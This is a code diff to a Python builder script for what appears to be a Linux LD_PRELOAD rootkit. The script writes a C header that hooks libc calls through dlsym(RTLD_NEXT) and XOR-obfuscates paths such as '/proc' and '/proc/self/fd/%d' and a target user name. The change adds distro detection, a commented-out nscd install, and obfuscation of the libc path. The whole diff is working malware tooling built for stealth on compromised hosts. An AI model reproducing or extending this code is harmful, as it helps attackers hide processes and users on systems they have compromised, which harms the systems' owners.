@@ -1,5 +1,6 @@
 from xor import xor 
 import os 
+import subprocess 
 
 class col: 
     BOLD = '\033[1m'
@@ -10,6 +11,19 @@ class col:
     NORM = '\033[34m'
 
 def main(): 
+    with open("/etc/lsb-release", "r") as f: 
+        lines = f.readlines() 
+        distro = [i.split("=")[1].replace("\n", "") for i in lines if i.split("=")[0] == "DISTRIB_ID"]
+    '''
+    if os.path.isfile("/etc/nscd.conf") == False: 
+        print("nscd is missing, installing")
+        if distro.lower() == "ubuntu" or distro.lower() == "debian":
+            apt = subprocess.Popen(['apt', 'install', 'nscd'],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE)
+            stdout, stderr = apt.communicate()
+            stdout, stderr
+    '''
     while True: 
         key = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "key: ")
         if len(key) != 1: 
@@ -25,7 +39,7 @@ def main():
     try:
         f = open("rkconst.h", "w")
         f.write("#ifndef RTLD_NEXT\n#define RTLD_NEXT ((void *) -11)\n#endif\n#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)\n#define CLEAN(var) clean(var, strlen(var))\n")
-        f.write("#define LIBC "  + "\"" + "/lib/libc.so.6" + "\"" + "\n")
+        f.write("#define LIBC "  + "\"" + xor("/lib/libc.so.6", key) + "\"" + "\n")
         f.write("#define PROC_PATH " + "\"" + xor("/proc/self/fd/%d", key) + "\"" + "\n")
         f.write("#define PROC " + "\"" + xor("/proc", key) + "\"" + "\n")
         f.write("#define USER " + "\"" + xor(user, key) + "\"" + "\n")
